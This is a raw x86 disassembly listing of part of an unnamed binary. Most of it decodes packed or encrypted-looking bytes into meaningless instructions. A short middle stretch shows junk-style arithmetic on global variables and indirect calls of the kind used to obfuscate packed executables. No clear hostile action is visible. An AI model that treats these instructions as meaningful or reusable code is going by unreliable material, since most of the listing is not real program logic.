  408bb5:	add    cl,ch
  408bb7:	rcl    BYTE PTR [eax-0x74c2a4ea],cl
  408bbd:	pop    edx
  408bbe:	and    BYTE PTR [esi*8-0x4ce4834e],bh
  408bc5:	mov    ds:0xcc0c7014,al
  408bca:	mov    BYTE PTR [edx-0x1cced626],ah
  408bd0:	mov    cl,BYTE PTR [esi+esi*4+0x502cdb10]
  408bd7:	stos   DWORD PTR es:[edi],eax
  408bd8:	cmp    DWORD PTR [edi],0x5bdaffc5
  408bde:	push   esi
  408bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be0:	(bad)  
  408be1:	cdq    
  408be2:	push   ebp
  408be3:	mov    al,0xc7
  408be5:	push   esi
  408be6:	int3   
  408be7:	pop    esp
  408be8:	fisttp WORD PTR [esi+0x6e]
  408beb:	inc    esp
  408bec:	mov    edi,0x589b5a3c
  408bf1:	test   al,0x1e
  408bf3:	pop    es
  408bf4:	and    ah,BYTE PTR [ecx]
  408bf6:	inc    DWORD PTR [eax-0x48]
  408bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bfa:	pop    edi
  408bfb:	adc    eax,0x3d2ba890
  408c00:	push   0x65
  408c02:	call   0xfe6fb971
  408c07:	shr    DWORD PTR [esp+eax*1],cl
  408c0a:	sub    BYTE PTR [ebp+0x6ce6b11f],bh
  408c10:	xor    BYTE PTR [eax],0x72
  408c13:	cmp    cl,BYTE PTR [ebx-0x2c54a55e]
  408c19:	mov    edi,0x8e78cd58
  408c1e:	sar    ch,0xe6
  408c21:	sub    esi,eax
  408c23:	dec    eax
  408c24:	or     DWORD PTR [esi+0x2889b5f4],esi
  408c2a:	test   DWORD PTR ds:0x9ffb6df9,0xbd5abed7
  408c34:	pushf  
  408c35:	jno    0x408c09
  408c37:	les    esp,FWORD PTR [ebx+eax*2]
  408c3a:	mov    ah,0x91
  408c3c:	out    dx,eax
  408c3d:	xchg   ebp,eax
  408c3e:	dec    edx
  408c3f:	add    esp,DWORD PTR [edi+0x2705d7be]
  408c45:	int    0xf
  408c47:	outs   dx,DWORD PTR ds:[esi]
  408c48:	and    eax,0xc182d0b8
  408c4d:	inc    esp
  408c4e:	loop   0x408c04
  408c50:	fmul   QWORD PTR es:[esi-0xf]
  408c54:	sbb    al,0x55
  408c56:	out    dx,al
  408c57:	jo     0x408c50
  408c59:	mov    bh,0xac
  408c5b:	sbb    DWORD PTR [esi-0x7933ffa6],edx
  408c61:	mov    ah,0xd1
  408c63:	out    dx,eax
  408c64:	es push esi
  408c66:	mov    dl,BYTE PTR [edx+ecx*8]
  408c69:	cmp    DWORD PTR [esi],ebx
  408c6b:	shr    BYTE PTR [eax-0x2f3b4ba2],cl
  408c71:	and    eax,0x4d5d08ac
  408c76:	jmp    0x408cd9
  408c78:	push   es
  408c79:	mov    ds:0xa04cf147,eax
  408c7e:	mov    al,0xb7
  408c80:	mov    esi,0xc7d171cf
  408c85:	sbb    al,0xd6
  408c87:	xchg   edi,eax
  408c88:	xchg   BYTE PTR [ecx+esi*8-0x523aa225],dh
  408c8f:	ds push cs
  408c91:	sbb    BYTE PTR [ebx-0x25c51797],al
  408c97:	lock loopne 0x408c2f
  408c9a:	ret    
  408c9b:	or     edi,DWORD PTR [eax]
  408c9d:	mov    dl,0x46
  408c9f:	mov    eax,ds:0xbf21036a
  408ca4:	pushf  
  408ca5:	pop    es
  408ca6:	push   ds
  408ca7:	outs   dx,BYTE PTR ds:[esi]
  408ca8:	jno    0x408cf3
  408caa:	aas    
  408cab:	test   DWORD PTR [ecx],edx
  408cad:	cmp    edx,ebx
  408caf:	shl    bl,1
  408cb1:	or     DWORD PTR [ebp-0xcc914a0],esp
  408cb7:	xor    al,0x3b
  408cb9:	and    eax,DWORD PTR [esi-0x36]
  408cbc:	mov    BYTE PTR [ebx+0x46da6e66],al
  408cc2:	adc    al,0x10
  408cc4:	inc    ebx
  408cc5:	xchg   ebx,eax
  408cc6:	sahf   
  408cc7:	push   ds
  408cc8:	pop    esp
  408cc9:	inc    ebx
  408cca:	mov    dh,0x70
  408ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ccd:	jmp    0xa43644e1
  408cd2:	lods   eax,DWORD PTR ds:[esi]
  408cd3:	dec    eax
  408cd4:	cmp    DWORD PTR [ebp-0x508f479d],ecx
  408cda:	je     0x408c77
  408cdc:	push   ds
  408cdd:	test   DWORD PTR [esp+ebp*4+0x8b4ffc9],edx
  408ce4:	mov    ebx,0xfc84a1b3
  408ce9:	out    dx,al
  408cea:	scas   eax,DWORD PTR es:[edi]
  408ceb:	dec    ebx
  408cec:	mov    ch,0x53
  408cee:	push   ebp
  408cef:	es (bad) 
  408cf1:	aam    0x39
  408cf3:	jp     0x408ccd
  408cf5:	hlt    
  408cf6:	out    0xf9,al
  408cf8:	inc    ebx
  408cf9:	xchg   BYTE PTR [ecx+0x7261d68a],dl
  408cff:	mov    al,ds:0x720e16f4
  408d04:	mov    cl,0xef
  408d06:	xlat   BYTE PTR ds:[ebx]
  408d07:	cwd    
  408d09:	fdivr  st(7),st
  408d0b:	(bad)  
  408d0c:	fs mov cl,0x4c
  408d0f:	push   ebp
  408d10:	sti    
  408d11:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  408d13:	je     0x408ce7
  408d15:	xor    al,0x5e
  408d17:	inc    ebp
  408d18:	mov    edx,0x2ecc8b58
  408d1d:	mov    ds:0xf30f7b14,al
  408d22:	aaa    
  408d23:	fisub  DWORD PTR [edi+0x3cdf0a2e]
  408d29:	or     BYTE PTR [esi+esi*2+0x45fb934f],bh
  408d30:	ins    BYTE PTR es:[edi],dx
  408d31:	ror    ebx,cl
  408d33:	cmc    
  408d34:	sub    bh,ah
  408d36:	addr16 inc edx
  408d38:	xchg   BYTE PTR [ecx-0x11],dh
  408d3b:	sbb    eax,0x2e4a26bf
  408d40:	test   eax,0x7fb93a3b
  408d45:	sbb    ebx,ebx
  408d47:	clc    
  408d48:	dec    edi
  408d49:	ss aas 
  408d4b:	inc    esi
  408d4c:	pop    edi
  408d4d:	setnp  BYTE PTR [edx-0x6e73d2be]
  408d54:	mov    ah,0x30
  408d56:	inc    eax
  408d57:	cmp    eax,DWORD PTR [edx+ecx*1+0xb100f5d]
  408d5e:	xchg   edi,eax
  408d5f:	fs aad 0x4a
  408d62:	dec    eax
  408d63:	mov    sp,0x62ed
  408d67:	and    ebx,DWORD PTR [eax]
  408d69:	mov    ecx,0x6145bae6
  408d6e:	(bad)  
  408d6f:	leave  
  408d70:	pop    ss
  408d71:	pop    ebx
  408d72:	xchg   ebx,eax
  408d73:	mov    ds:0x4d0a5edc,al
  408d78:	aas    
  408d79:	add    ah,ah
  408d7b:	call   0xbe5d4847
  408d80:	(bad)  
  408d81:	sahf   
  408d82:	add    ch,bl
  408d84:	mov    ah,0x3b
  408d86:	sbb    BYTE PTR [edi+0x1e],0xe2
  408d8a:	(bad)  
  408d8b:	std    
  408d8c:	fldenv [ecx-0x77]
  408d8f:	scas   al,BYTE PTR es:[edi]
  408d90:	mov    al,0x93
  408d92:	add    DWORD PTR [esi],0x89e62aa5
  408d98:	js     0x408da9
  408d9a:	jl     0x408d9b
  408d9c:	lock mov ebx,0x9ba7c0
  408da2:	jg     0x408d7c
  408da4:	stos   DWORD PTR es:[edi],eax
  408da5:	adc    DWORD PTR [esi-0x76],ebx
  408da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408da9:	outs   dx,BYTE PTR ds:[esi]
  408daa:	mov    eax,0xbc20c25
  408daf:	jge    0x408d77
  408db1:	lods   al,BYTE PTR ds:[esi]
  408db2:	inc    ebx
  408db3:	cmp    eax,0xb6c09b38
  408db8:	fistp  WORD PTR [ebp-0x1]
  408dbb:	loope  0x408da1
  408dbd:	das    
  408dbe:	push   ds
  408dbf:	out    dx,eax
  408dc0:	aad    0xd0
  408dc2:	jge    0x408d53
  408dc4:	add    al,bh
  408dc6:	inc    edi
  408dc7:	add    BYTE PTR [ecx+ebp*8+0x5e],ch
  408dcb:	jecxz  0x408df2
  408dcd:	xor    al,BYTE PTR [edi-0x6a7c8ba0]
  408dd3:	add    dl,cl
  408dd5:	ds jmp 0x7188:0x73242bb9
  408ddd:	into   
  408dde:	mov    dl,0x4a
  408de0:	and    al,0xe7
  408de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de3:	dec    ebp
  408de4:	mov    ebx,0x2f3a4c67
  408de9:	sahf   
  408dea:	adc    ecx,ecx
  408dec:	xchg   DWORD PTR [ebx+0x7b],ecx
  408def:	addr16 mov edx,ds
  408df2:	inc    ebp
  408df3:	push   ds
  408df4:	scas   eax,DWORD PTR es:[edi]
  408df5:	pop    esi
  408df6:	cld    
  408df7:	cmp    cl,bl
  408df9:	xor    dh,BYTE PTR [esi+0x3d42e68a]
  408dff:	hlt    
  408e00:	fisubr WORD PTR [ecx-0x461782eb]
  408e06:	and    eax,0x9ce8259b
  408e0b:	sahf   
  408e0c:	pop    es
  408e0d:	into   
  408e0e:	or     eax,0xf937de61
  408e13:	lea    esi,[ebp+esi*2-0x72]
  408e17:	xchg   edi,eax
  408e18:	sub    esp,DWORD PTR [esi+0x7f]
  408e1b:	ins    DWORD PTR es:[edi],dx
  408e1c:	bnd jp 0x408e77
  408e1f:	into   
  408e20:	enter  0xf651,0x12
  408e24:	jo     0x408de8
  408e26:	cmovg  edx,DWORD PTR [eax-0x55]
  408e2a:	mov    eax,ds:0x2398bb5f
  408e2f:	call   0x99c2ff2e
  408e34:	xor    eax,0x8013eea
  408e39:	mov    ebx,0xeaabd2ad
  408e3e:	jno    0x408e4c
  408e40:	mov    BYTE PTR [eax+0xcaf04aa],bh
  408e46:	jg     0x408e4d
  408e48:	xchg   esp,eax
  408e49:	pushf  
  408e4a:	jnp    0x408def
  408e4c:	mov    cl,0x81
  408e4e:	adc    BYTE PTR [ecx+eax*1-0x2e],dh
  408e52:	stos   DWORD PTR es:[edi],eax
  408e53:	cmp    BYTE PTR [edx-0x49],ch
  408e56:	jno    0x408e0d
  408e58:	jmp    0xc456:0x29a3b181
  408e5f:	test   DWORD PTR [esi+0x582c8f88],0xfb93487a
  408e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e6a:	pop    ecx
  408e6b:	cmp    edx,DWORD PTR [eax-0x4c]
  408e6e:	push   esp
  408e6f:	inc    edi
  408e70:	out    dx,eax
  408e71:	bound  ebx,QWORD PTR [eax+0x7f]
  408e74:	sub    dh,BYTE PTR [esp+eax*4+0xc6bcba1]
  408e7b:	aam    0xb8
  408e7d:	imul   edi,DWORD PTR [edi+0x1eefdd8e],0xe5cba3c4
  408e87:	jl     0x408e40
  408e89:	jbe    0x408e6d
  408e8b:	inc    ecx
  408e8c:	inc    ebx
  408e8d:	push   ecx
  408e8e:	fwait
  408e8f:	retf   
  408e90:	neg    BYTE PTR [eax]
  408e92:	dec    ebp
  408e93:	pop    eax
  408e94:	and    BYTE PTR [esi],bl
  408e96:	aam    0x75
  408e98:	es and al,0xa9
  408e9b:	cmp    ecx,DWORD PTR [ebp+0x52]
  408e9e:	push   eax
  408e9f:	pop    DWORD PTR [edx+0x54680b6f]
  408ea5:	aad    0x14
  408ea7:	pop    esi
  408ea8:	ja     0x408f22
  408eaa:	test   eax,0xa9e6f81d
  408eaf:	ret    
  408eb0:	clc    
  408eb1:	call   0x81d4:0x37a21cbc
  408eb8:	pusha  
  408eb9:	mov    ecx,0xc74cb8ee
  408ebe:	div    BYTE PTR [ecx]
  408ec0:	dec    edx
  408ec1:	daa    
  408ec2:	lods   eax,DWORD PTR ds:[esi]
  408ec3:	pop    ds
  408ec4:	jbe    0x408efb
  408ec6:	xor    BYTE PTR [edi-0x58],al
  408ec9:	mov    edi,0x50539f9b
  408ecf:	fistp  QWORD PTR [esi]
  408ed1:	in     al,dx
  408ed2:	cwde   
  408ed3:	in     al,dx
  408ed4:	inc    ecx
  408ed5:	std    
  408ed6:	mov    ah,0x5c
  408ed8:	in     eax,0xd2
  408eda:	hlt    
  408edb:	nop
  408edc:	push   ebp
  408edd:	loop   0x408efa
  408edf:	xlat   BYTE PTR ds:[ebx]
  408ee0:	enter  0xd13c,0x7c
  408ee4:	pop    ecx
  408ee5:	mov    ah,0x74
  408ee7:	test   al,0x5d
  408ee9:	jbe    0x408ef1
  408eeb:	sub    al,0x56
  408eed:	fnstenv [edx*2+0x191e9b62]
  408ef4:	aaa    
  408ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef6:	dec    esi
  408ef7:	jecxz  0x408ebd
  408ef9:	xor    DWORD PTR [eax-0x60],esi
  408efc:	or     DWORD PTR [ebx-0x4b],edi
  408eff:	int3   
  408f00:	add    BYTE PTR [edi-0x40],ah
  408f03:	mov    ch,BYTE PTR [ebx]
  408f05:	or     eax,0x7c53b699
  408f0a:	add    BYTE PTR [ecx-0x7f],ah
  408f0d:	bnd jo 0x408e96
  408f10:	call   0x730d53ec
  408f15:	cmp    eax,0x4a191bb2
  408f1a:	stos   BYTE PTR es:[edi],al
  408f1b:	jns    0x408eea
  408f1d:	sbb    BYTE PTR [edi-0x77],0xd2
  408f21:	mov    esp,0x6d08af25
  408f26:	jbe    0x408f85
  408f28:	jno    0x408eb7
  408f2a:	pop    ds
  408f2b:	or     BYTE PTR [eax-0x2dd574a6],ch
  408f31:	mov    ebx,0x62fa4bc5
  408f36:	inc    ebx
  408f37:	dec    ebp
  408f38:	cmp    eax,0x97875cbe
  408f3d:	(bad)  
  408f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f40:	fisubr WORD PTR [esi-0x78]
  408f43:	adc    al,0xd6
  408f45:	loopne 0x408ed0
  408f47:	and    eax,0xaec62982
  408f4c:	ins    BYTE PTR es:[edi],dx
  408f4d:	lods   al,BYTE PTR ds:[esi]
  408f4e:	mov    WORD PTR [ecx+edx*1+0x18],ds
  408f52:	mov    eax,0x7c58cbe5
  408f57:	mov    ds:0xa3faa836,eax
  408f5c:	cmp    eax,0xac421cd5
  408f61:	or     al,0x72
  408f63:	mov    ecx,DWORD PTR [ebp-0x1c]
  408f66:	and    DWORD PTR ds:0x4229be,ecx
  408f6c:	shrd   eax,ecx,0x2
  408f70:	xor    edx,DWORD PTR ds:0x4229aa
  408f76:	shr    ecx,0x2
  408f79:	add    DWORD PTR ds:0x4228ea,0x4c61
  408f83:	mov    ecx,DWORD PTR [ebp-0x20]
  408f86:	xor    edx,DWORD PTR ds:0x4228d2
  408f8c:	mov    edx,DWORD PTR [ebp-0x1c]
  408f8f:	xor    DWORD PTR ds:0x42297e,0xf7e
  408f99:	xor    eax,edi
  408f9b:	shl    ecx,0x1e
  408f9e:	sbb    ecx,DWORD PTR ds:0x42294e
  408fa4:	xor    edx,edx
  408fa6:	cmp    DWORD PTR ds:0x422916,0x0
  408fad:	mov    ecx,0xa46
  408fb2:	mov    DWORD PTR ds:0x4229ce,0x4de7
  408fbc:	mov    DWORD PTR ds:0x42291e,ecx
  408fc2:	jmp    0x409028
  408fc7:	mov    DWORD PTR ds:0x42298a,0x3b5
  408fd1:	jne    0x40900c
  408fd7:	push   DWORD PTR [ebp-0x20]
  408fda:	push   DWORD PTR [ebp-0x1c]
  408fdd:	push   DWORD PTR [ebp-0x10]
  408fe0:	call   DWORD PTR ds:0x42a020
  408fe6:	xor    ecx,ecx
  408fe8:	add    ecx,DWORD PTR ds:0x4228c2
  408fee:	and    DWORD PTR ds:0x4229ae,ecx
  408ff4:	mov    ecx,DWORD PTR ds:0x4228f2
  408ffa:	sub    DWORD PTR ds:0x42292e,ecx
  409000:	add    ecx,DWORD PTR ds:0x4229a6
  409006:	xor    DWORD PTR ds:0x4229a2,ebx
  40900c:	mov    ecx,DWORD PTR ds:0x42298a
  409012:	or     DWORD PTR ds:0x4228f6,ecx
  409018:	adc    ecx,0x6cf8
  40901e:	adc    DWORD PTR ds:0x422962,0xa1e
  409028:	or     eax,edx
  40902a:	cmp    DWORD PTR ds:0x4228e6,0x0
  409031:	mov    DWORD PTR ds:0x42289e,0x3e29
  40903b:	mov    ecx,0x398
  409040:	jmp    0x409109
  409045:	mov    DWORD PTR ds:0x4228e6,0x60d3
  40904f:	mov    DWORD PTR ds:0x4228ce,0x6d23
  409059:	je     0x409087
  40905f:	push   DWORD PTR [ebp-0x14]
  409062:	push   DWORD PTR [ebp-0x1c]
  409065:	push   0x422835
  40906a:	push   DWORD PTR [ebp-0x28]
  40906d:	call   DWORD PTR ds:0x42a024
  409073:	sbb    DWORD PTR ds:0x42293a,0x5600
  40907d:	sub    DWORD PTR ds:0x422942,0x2629
  409087:	add    ecx,0x569a
  40908d:	sub    edx,edx
  40908f:	and    DWORD PTR ds:0x4228c6,edx
  409095:	cmp    DWORD PTR ds:0x4229ae,0x0
  40909c:	mov    DWORD PTR ds:0x42298a,0x14a0
  4090a6:	movzx  edx,BYTE PTR ds:0x42293e
  4090ad:	mov    ecx,0x236d
  4090b2:	jmp    0x409109
  4090b7:	mov    DWORD PTR ds:0x4229ae,ecx
  4090bd:	mov    DWORD PTR ds:0x42292e,0x5874
  4090c7:	jge    0x4090e5
  4090cd:	push   DWORD PTR [ebp-0x28]
  4090d0:	push   DWORD PTR [ebp-0xc]
  4090d3:	call   DWORD PTR ds:0x42a050
  4090d9:	xor    DWORD PTR ds:0x422916,edx
  4090df:	sbb    ecx,0x5177
  4090e5:	mov    ecx,DWORD PTR ds:0x4229e2
  4090eb:	mov    edx,DWORD PTR ds:0x422a62
  4090f1:	sub    ecx,edx
  4090f3:	sub    ecx,DWORD PTR [ecx+edx*1]
  4090f6:	movzx  edx,BYTE PTR ds:0x4229ca
  4090fd:	or     edx,DWORD PTR ds:0x4228d6
  409103:	mov    DWORD PTR ds:0x4229ca,edx
  409109:	lea    eax,[ebp+eax*1-0x4]
  40910d:	mov    DWORD PTR [ebp-0x34],eax
  409110:	mov    eax,DWORD PTR [ebp-0x20]
  409113:	mov    ecx,DWORD PTR [ebp-0x1c]
  409116:	shrd   eax,ecx,0x2
  40911a:	shr    ecx,0x2
  40911d:	mov    ecx,DWORD PTR [ebp-0x20]
  409120:	mov    edx,DWORD PTR [ebp-0x1c]
  409123:	jmp    0x4096ad
  409128:	add    DWORD PTR [edx+0x589575b5],ebp
  40912e:	inc    eax
  40912f:	and    dh,BYTE PTR [ebx+0x1a6e9c95]
  409135:	xor    BYTE PTR [esi+0x6e],ah
  409138:	scas   eax,DWORD PTR es:[edi]
  409139:	aas    
  40913a:	push   ss
  40913b:	push   ss
  40913c:	cmp    eax,0x23161604
  409141:	ins    DWORD PTR es:[edi],dx
  409142:	add    eax,0xb4491936
  409147:	loopne 0x4091c8
  409149:	and    eax,0xe3ae6606
  40914e:	lds    ebx,FWORD PTR [esi]
  409150:	xor    eax,0xf26e907d
  409155:	fstp   DWORD PTR [eax+0x3d62a896]
  40915b:	mov    WORD PTR [ebx+0x1d],?
  40915e:	aad    0xb7
  409160:	xchg   DWORD PTR [edi+0x52],ebx
  409163:	and    BYTE PTR [ebp+0x2a65b5cc],0xf7
  40916a:	sbb    BYTE PTR [ebp+0x33745132],0x6f
  409171:	mov    ah,0x50
  409173:	retf   0xf524
  409176:	cli    
  409177:	xchg   edi,eax
  409178:	inc    edx
  409179:	outs   dx,DWORD PTR ds:[esi]
  40917a:	or     bl,0x9f
  40917d:	or     DWORD PTR [esp+edi*2],ebp
  409180:	xlat   BYTE PTR ds:[ebx]
  409181:	scas   al,BYTE PTR es:[edi]
  409182:	sti    
  409183:	(bad)  
  409184:	push   cs
  409185:	call   0x5c6d002b
  40918a:	mov    cl,0xc
  40918c:	mov    bh,0xd4
  40918e:	(bad)  
  40918f:	mov    ah,0xd9
  409191:	ret    0xf0d9
  409194:	mov    ecx,0xa1aeffa6
  409199:	push   edi
  40919a:	int    0x19
  40919c:	xor    DWORD PTR [edx+0x3b],ebx
  40919f:	add    al,0x54
  4091a1:	mov    cl,0x49
  4091a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a4:	es push esi
  4091a6:	enter  0x8dff,0x1a
  4091aa:	lods   al,BYTE PTR ds:[esi]
  4091ab:	jno    0x4091ca
  4091ad:	out    0x52,al
  4091af:	repz inc ebp
  4091b1:	in     eax,0xa7
  4091b3:	call   DWORD PTR [edi]
  4091b5:	sub    al,0x11
  4091b7:	sbb    al,0xa5
  4091b9:	out    0xea,al
  4091bb:	xor    al,0xdb
  4091bd:	clc    
  4091be:	and    dh,BYTE PTR [edx+ecx*4]
  4091c1:	xor    DWORD PTR [esi+0xe6b9c67],esp
  4091c7:	out    0x4f,al
  4091c9:	lds    edx,FWORD PTR [ebx]
  4091cb:	cmp    bh,dl
  4091cd:	push   ecx
  4091ce:	push   0x7de4a20c
  4091d3:	and    ah,bh
  4091d5:	into   
  4091d6:	pusha  
  4091d7:	adc    eax,0x581383b9
  4091dc:	mov    bh,0xdd
  4091de:	in     al,0x25
  4091e0:	jmp    0x55b1:0x61a2d3ce
  4091e7:	sbb    bl,dl
  4091e9:	mov    ah,0xb3
  4091eb:	pop    edx
  4091ec:	jo     0x409176
  4091ee:	jge    0x409205
  4091f0:	push   0x5d
  4091f2:	jo     0x40922b
  4091f4:	dec    ebx
  4091f5:	or     ebx,DWORD PTR [ebp-0x33]
  4091f8:	push   ss
  4091f9:	in     al,dx
  4091fa:	fisttp WORD PTR [ebp-0x4badbb51]
  409200:	jmp    0x4304e432
  409205:	xchg   ebx,eax
  409206:	cld    
  409207:	sub    DWORD PTR [edi-0x3b],0x56
  40920b:	sbb    cl,ch
  40920d:	xchg   ebx,eax
  40920e:	gs imul esi,ebx,0xffffffb3
  409212:	mov    al,ds:0x3cdd41ef
  409217:	idiv   BYTE PTR [esi+0x5b]
  40921a:	sbb    BYTE PTR [ebx],dl
  40921c:	(bad)  
  40921d:	enter  0x43a6,0xe5
  409221:	pop    ebp
  409222:	cmp    edi,edx
  409224:	pushf  
  409225:	jne    0x4091ce
  409227:	leave  
  409228:	mov    dh,0x30
  40922a:	test   DWORD PTR [esi],edi
  40922c:	mov    ebp,0x760f2c88
  409231:	push   ebx
  409232:	dec    ecx
  409233:	test   eax,0xebe8b202
  409238:	test   DWORD PTR [eax+eiz*1-0xe],eax
  40923c:	fwait
  40923d:	or     DWORD PTR [ecx-0x66],0xfffffff7
  409241:	call   FWORD PTR [edi+0x66]
  409244:	fld    DWORD PTR [ebx]
  409246:	call   0xe992:0x53f82803
  40924d:	mov    ebx,0x1c2ae521
  409252:	jg     0x409299
  409254:	scas   eax,DWORD PTR es:[edi]
  409255:	sbb    dh,al
  409257:	xor    dh,BYTE PTR [edx+0x63]
  40925a:	das    
  40925b:	and    eax,0xc662b148
  409260:	bound  edi,QWORD PTR [esi-0x5c821ce7]
  409266:	inc    ebx
  409267:	jmp    0x93431d4
  40926c:	sub    al,0x79
  40926e:	ficomp DWORD PTR [edx]
  409270:	pusha  
  409271:	add    BYTE PTR [ebp-0x60f37f1e],al
  409277:	popf   
  409278:	pop    eax
  409279:	jne    0x409220
  40927b:	push   ax
  40927d:	shl    BYTE PTR [ecx-0x74],1
  409280:	lahf   
  409281:	out    0xd4,al
  409283:	and    dl,BYTE PTR ds:0x22e1cf8f
  409289:	xchg   esp,eax
  40928a:	xor    ebx,edi
  40928c:	xchg   esp,eax
  40928d:	mov    ds:0xc039749f,al
  409292:	mov    esp,DWORD PTR [ebx+0x2c]
  409295:	lds    esp,FWORD PTR [ecx]
  409297:	repz mov ch,0xb2
  40929a:	or     al,0xa6
  40929c:	cld    
  40929d:	int    0x79
  40929f:	cld    
  4092a0:	rcr    ah,0x60
  4092a3:	(bad)
  4092a7:	sbb    BYTE PTR [edx],bh
  4092a9:	push   edx
  4092aa:	retf   
  4092ab:	out    0x79,eax
  4092ad:	pop    esp
  4092ae:	add    DWORD PTR [edx*8-0xa1472da],esp
  4092b5:	test   al,0x62
  4092b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b8:	test   eax,0x912f3152
  4092bd:	repnz mov ch,0x61
  4092c0:	test   eax,0x33d06304
  4092c5:	cdq    
  4092c6:	inc    BYTE PTR [edx+0x1be5e8dd]
  4092cc:	std    
  4092cd:	ss ins DWORD PTR es:[edi],dx
  4092cf:	cmpxchg DWORD PTR [ecx-0x4efb69a2],esi
  4092d6:	jp     0x40932a
  4092d8:	ficom  WORD PTR [ebp+eax*1-0x375c03b4]
  4092df:	mov    bl,0x67
  4092e1:	jecxz  0x40934d
  4092e3:	push   ebp
  4092e4:	ins    DWORD PTR es:[edi],dx
  4092e5:	or     BYTE PTR [ebp+esi*2-0x6063f7b0],dh
  4092ec:	(bad)
  4092ef:	ja     0x4092c4
  4092f1:	add    al,0x70
  4092f3:	add    al,0xdf
  4092f5:	jg     0x4092a7
  4092f7:	nop
  4092f8:	jae    0x4092fc
  4092fa:	push   es
  4092fb:	push   esp
  4092fc:	sub    DWORD PTR [ecx+0x54],edi
  4092ff:	int    0x2f
  409301:	mov    edi,0x5efc0c1c
  409306:	mov    edi,0x7911fd68
  40930b:	or     DWORD PTR ds:0x210346b0,edx
  409311:	xchg   esp,eax
  409312:	inc    esp
  409313:	cmp    DWORD PTR [eax],0xffffffa0
  409316:	pop    esi
  409317:	lea    ebp,[ebp+0x7576bae1]
  40931d:	inc    esp
  40931e:	adc    eax,0x34645f0d
  409323:	out    0xd2,al
  409325:	jmp    0x9b0a4c5d
  40932a:	sti    
  40932b:	mov    bl,0x8a
  40932d:	cmp    DWORD PTR [ecx+0x32],ebp
  409330:	nop
  409331:	mov    ecx,0x3356d1bf
  409336:	fmul   DWORD PTR [ebx]
  409338:	call   0x222f0429
  40933d:	nop
  40933e:	sbb    al,0xaf
  409340:	test   edx,0x8e0c353
  409346:	in     eax,0x24
  409348:	mov    eax,0x5f19fb23
  40934d:	popa   
  40934e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409350:	push   cs
  409351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409352:	imul   esp,ebp,0x4a05b269
  409358:	rcl    BYTE PTR [ebx+0x253177c1],cl
  40935e:	cmp    dh,BYTE PTR [ebp+eax*2+0x2e]
  409362:	daa    
  409363:	mov    edi,0xef94e978
  409368:	adc    eax,0x6d28d3a4
  40936d:	(bad)  
  40936f:	mov    DWORD PTR [ebx+0x54],esp
  409372:	jl     0x4092fc
  409374:	imul   edx,ebp,0x5c
  409377:	xlat   BYTE PTR ds:[ebx]
  409378:	push   0xcb70d023
  40937d:	mov    edi,0x34ef0a0
  409382:	jle    0x409326
  409384:	shr    al,cl
  409386:	lahf   
  409387:	cmp    dl,bh
  409389:	cs sub eax,0x3ef86261
  40938f:	sub    dl,BYTE PTR [esi]
  409391:	in     al,dx
  409392:	jmp    0x41a3:0x17e21b39
  409399:	xchg   esp,eax
  40939a:	pop    esi
  40939b:	int    0x6e
  40939d:	out    0x9,al
  40939f:	sub    ch,BYTE PTR [ebp-0x42]
  4093a2:	dec    edi
  4093a3:	jg     0x4093a6
  4093a5:	int    0x9c
  4093a7:	(bad)  
  4093a8:	(bad)  
  4093aa:	adc    al,0x9b
  4093ac:	cs stc 
  4093ae:	test   eax,0xd7e3edd4
  4093b3:	cli    
  4093b4:	mov    DWORD PTR [ecx+edi*1+0x6a],0xe7a46c30
  4093bc:	repnz out dx,eax
  4093be:	jle    0x409409
  4093c0:	add    DWORD PTR [eax-0x67b8b132],esi
  4093c6:	dec    eax
  4093c7:	ds push ebx
  4093c9:	add    cl,BYTE PTR [edx-0x20]
  4093cc:	xchg   ecx,esi
  4093ce:	pop    ss
  4093cf:	ss into 
  4093d1:	jp     0x409398
  4093d3:	aam    0xe5
  4093d5:	push   ebx
  4093d6:	mov    bl,0xce
  4093d8:	pop    ss
  4093d9:	retf   
  4093da:	cmp    eax,DWORD PTR [edx]
  4093dc:	mov    edi,0x45867a95
  4093e1:	jns    0x4093f2
  4093e3:	pop    edi
  4093e4:	rcr    DWORD PTR [ecx-0x3592a328],0xab
  4093eb:	adc    ax,di
  4093ee:	test   eax,0x8d5bd235
  4093f3:	jae    0x4093bb
  4093f5:	inc    ebx
  4093f6:	not    BYTE PTR [eax-0x65]
  4093f9:	jmp    0x959e:0xee6931a0
  409400:	je     0x4093ee
  409402:	dec    ebx
  409403:	inc    ebp
  409404:	pop    edx
  409405:	xchg   ecx,eax
  409406:	scas   eax,DWORD PTR es:[edi]
  409407:	sub    al,0xc0
  409409:	push   ecx
  40940a:	pop    ds
  40940b:	push   ss
  40940c:	shr    eax,0xa4
  40940f:	dec    esp
  409410:	and    al,0x28
  409412:	lods   al,BYTE PTR ds:[esi]
  409413:	cmp    al,0xf8
  409415:	in     eax,0x3c
  409417:	es pop ebx
  409419:	ficom  WORD PTR [esi-0x5f6880ac]
  40941f:	retf   0x7a36
  409422:	xor    al,0xc2
  409424:	push   eax
  409425:	adc    ch,BYTE PTR [edx-0x48]
  409428:	test   DWORD PTR ds:0x230609bc,ebx
  40942e:	mov    edi,DWORD PTR [edi+0x7b]
  409431:	lock sbb BYTE PTR [esi],ch
  409434:	not    DWORD PTR [eax+esi*4-0x80]
  409438:	mov    bl,0x62
  40943a:	fst    DWORD PTR [edx-0x3f918f5a]
  409440:	xchg   DWORD PTR [ecx],esi
  409442:	lea    esi,[eax-0x746a823]
  409448:	inc    esi
  409449:	pop    ebx
  40944a:	pusha  
  40944b:	stos   BYTE PTR es:[edi],al
  40944c:	cld    
  40944d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40944e:	retf   0x89da
  409451:	mov    ds:0xaa6004b4,eax
  409456:	mov    edx,DWORD PTR [edx+0x4a]
